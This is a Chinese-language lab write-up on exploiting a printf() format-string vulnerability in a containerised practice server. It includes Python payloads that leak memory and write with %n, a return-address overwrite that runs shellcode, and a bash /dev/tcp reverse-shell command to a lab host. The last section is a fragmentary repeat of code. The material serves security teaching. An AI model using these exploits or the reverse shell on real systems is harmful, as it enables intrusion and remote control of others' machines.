格式化字符串漏洞是由于程序在处理用户输入的格式化字符串时，未正确验证输入内容，导致攻击者可以通过构造恶意输入，控制程序的行为。

本实验研究 printf() 函数格式化字符串漏洞及其利用。

<!--more-->

- Format string vulnerability, and code injection
- Stack layout
- Shellcode
- Reverse shell

## 环境搭建

```bash
$ dcbuild
$ dcup
# 关闭实验环境
$ dcdown
```

暂时关闭地址空间随机化

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

在 server-code 中编译：

```bash
$ make
$ make install
```



利用管道符发送消息：

```
echo hello | nc 10.9.0.5 9090
cat <file> | nc 10.9.0.5 9090
```



## 源码分析

有风险的程序源代码：

```c
unsigned int target = 0x11223344;
char *secret = "A secret message\n";
void myprintf(char *msg){
	// This line has a format-string vulnerability
	printf(msg);
}
int main(int argc, char **argv){
	char buf[1500];
	int length = fread(buf, sizeof(char), 1500, stdin);
	printf("Input size: %d\n", length);
	myprintf(buf);
	return 1;
}
```

从 stdin 读取内容到 `buf` ，调用 `myprintf` 函数，直接调用 `printf(msg)`，所以这里打印目标 buf，以及格式化字符串都是可以控制的。

## 实验内容



### Task 1 - Crashing the Program

可以控制 buf 和 format string，利用 %s 解析字符串指针，而栈上恰好是一个合法指针的概率是很低的

```bash
echo %s | nc 10.9.0.5 9090
```

![image-20260323122205387](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB/2.png)

第二次输入 %s 时，没有返回 Returned properly，代表程序已经崩溃





### Task 2 - Printing Out the Server Program’s Memory

#### Stack Data

> The goal is to print out the data on the stack. How many %x format specifiers
> do you need so you can get the server program to print out the first four bytes of your input? You
> can put some unique numbers (4 bytes) there, so when they are printed out, you can immediately tell.
> This number will be essential for most of the subsequent tasks, so make sure you get it right.

打印栈数据，要问多少个 %x 才能打印输入的内容，直接输入一个较大的数量，然后观察看到输入出现的位置，计算即可

```python
import sys
payload = b"\x11\x11\x11\x11"
payload += b"%x" * 64
sys.stdout.buffer.write(payload)
```

![image-20260323125318553](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB/3.png)

第 64 个 4 字节 ：刚好打印构造的 payload 前四个字节： `11 11 11 11`



#### Heap Data

>  There is a secret message (a string) stored in the heap area, and you can find the
> address of this string from the server printout. Your job is to print out this secret message. To achieve
> this goal, you need to place the address (in the binary form) of the secret message in the format string.

要求打印堆上的 secret message，利用 %s 格式化字符串指针即可

```
The secret message's address:  0x080b4008
```

之前计算过第 64 个四字节位置 buf 开始，将 secret message 地址放在头部， %s 格式化第 64 个四字节即可

```python
import sys
payload = (0x080b4008).to_bytes(4, byteorder='little')
payload += b"%x" * 63
payload += b"%s"
sys.stdout.buffer.write(payload)
```

63 个 %x 输出四字节数， 1 个 %s 输出指向的字符串，地址在 payload 头部

![image-20260323125726593](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB/4.png)

输出 A secret message



### Task 3 - Modifying the Server Program’s Memory

target 是堆上的数据，和任务二类似，将 %s 读取，改为 %n 写入



#### 修改 target 为任意值

```
The target variable's address: 0x080e5068
The target variable's value (before): 0x11223344
```

%n 往指定地址写入目前已经输出的字符数量 

```python
import sys
payload = (0x080e5068).to_bytes(4, byteorder='little')
payload += b"%x" * 63
payload += b"%n"
sys.stdout.buffer.write(payload)
```

向第 64 个四字节（0x080e5068）地址处，使用 %n 写入一个数即可

![image-20260323131724828](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB/5.png)



#### 修改为 0x5000

> %20476c的意思是：输出一个20476字符宽的字段
> %64$n表示：找到第64个参数并写入

payload 4 字节 +  0x5000 - 4 个字节，即输出的字节数，将这个数写入第 64 个参数，32 位系统参数是 4 字节，也就是 buf 开始位置，这和使用 %x 格式化 4 字节是一样的。

```python
import sys
payload = (0x080e5068).to_bytes(4, byteorder='little')
offset = 0x5000
payload += f"%{offset - 4}c".encode()
payload += b"%64$n"
sys.stdout.buffer.write(payload)
```

#### 修改为 0xAABBCCDD

如果像上面一样输出 0xAABBCCDD 个字符效率很低，实验提示可以分两次写，0xAABBCCDD，高位写为 AABB，低位写为 CCDD

AABB < CCDD，应该先写高位

- 高位：0x080e5068 + 2
- 低位：0x080e5068 

与之前不同的是要在 buf 开头写入两个地址，占 8 字节，写入顺序不影响，我将低位对应地址写在第 64 个参数，高位对应地址写在第 65 个参数



输出开头两个地址的 8 字节

先输出 0xAABB - 8 个字节，然后向第 65 个参数处写入（0xAABB）

再输出 0xCCDD - ( 0xAABB - 8) 个字节，然后向第 64 个参数处写入（0xCCDD）

```python
import sys

target = 0x080e5068

high = 0xAABB # 0x080e5068 + 0x2 = 0x080e506A
low  = 0xCCDD # 0x080e5068

payload = (0x080e5068).to_bytes(4, byteorder='little')   
payload += (0x080e506A).to_bytes(4, byteorder='little')

# 68 50 0e 08 -> dd cc bb aa 
payload += f"%{high - 8}c%65$hn".encode()     # high - 8
payload += f"%{low - high}c%64$hn".encode()   # low - 8 - (high - 8) 

sys.stdout.buffer.write(payload)
```

### Task 4 - Inject Malicious Code into the Server Program



```
server-10.9.0.5 | The input buffer's address:    0xffffd330
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 0 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd258
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

<img src="../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB/8.png" alt="image-20260416233943447" style="zoom:67%;" />

- Question 1: What are the memory addresses at the locations marked by 2 and 3?

	2：myprintf的返回地址：ebp + 4 = 0xffffd258 + 4 = 0xffffd25c

	3：buf的地址： 0xffffd330

- Question 2: How many %x format specifiers do we need to move the format string argument pointer
	to 3? Remember, the argument pointer starts from the location above 1.

	64 个 4 字节刚好能解析 buf 第一个 4 字节



接下来要获取 Reverse Shell

Shellcode 已经给出，为了解析地址，将其放到 buf 的固定位置，就放在最后面，这样 shellcode 地址是  `buf 地址 + 1500 - len(shellcode)`

然后将 myprintf 的返回地址改成 shellcode 的地址即可，这部分和任务三一样分高位低位写



```python
#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

ebp = 0xffffd258
buf = 0xffffd330

N = 1500
content = bytearray(0x90 for i in range(N))
shellcode = shellcode_32

start = 1500-len(shellcode)  # 134
content[start:start + len(shellcode)] = shellcode

ret_addr=ebp + 4   # 获取 myprintf 的返回地址，要往这里写入 shellcode 的地址

ret_low=ret_addr     # 低位
ret_high=ret_addr+2  # 高位

content[4:8]=(ret_low).to_bytes(4,byteorder='little')
content[0:4]=(ret_high).to_bytes(4,byteorder='little')

shellcode_addr = buf + start # shellcode 地址

low = shellcode_addr & 0xffff           
high = (shellcode_addr >> 16) & 0xffff 

payload = f"%{low - 8}c%65$hn".encode()     # 向返回地址的高位写 shellcode 地址的 高二位 
payload += f"%{high - low}c%64$hn".encode() # 向返回地址的低位写 shellcode 地址的 低二位

content[8:8+len(payload)] = payload

sys.stdout.buffer.write(content)
```

现在弹出 Success！ 说明 shellcode 执行成功，现在使用 Reverse shell

```bash
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *
```

- `/bin/bash -i ` 以交互模式启动 bash shell
- `>` 重定向标准输出
- `/dev/tcp/10.9.0.1/9090` 打开一个 TCP 连接，连接到 10.9.0.1:9090 ，标准输出到 TCP 连接
- `0<&1` 标准输入 重定向 到标准输出（TCP连接），标准输入从 TCP 连接读取
- `2>&1` 标准错误 重定向 到标准输出（TCP连接），标准错误输出到 TCP 连接

   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   # "/bin/ls -l; echo '===== Success! ======'                  *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL

buf = 0xffffd330

start = 1500-len(shellcode)

ret_low=ret_addr

content[4:8]=(ret_low).to_bytes(4,byteorder='little')
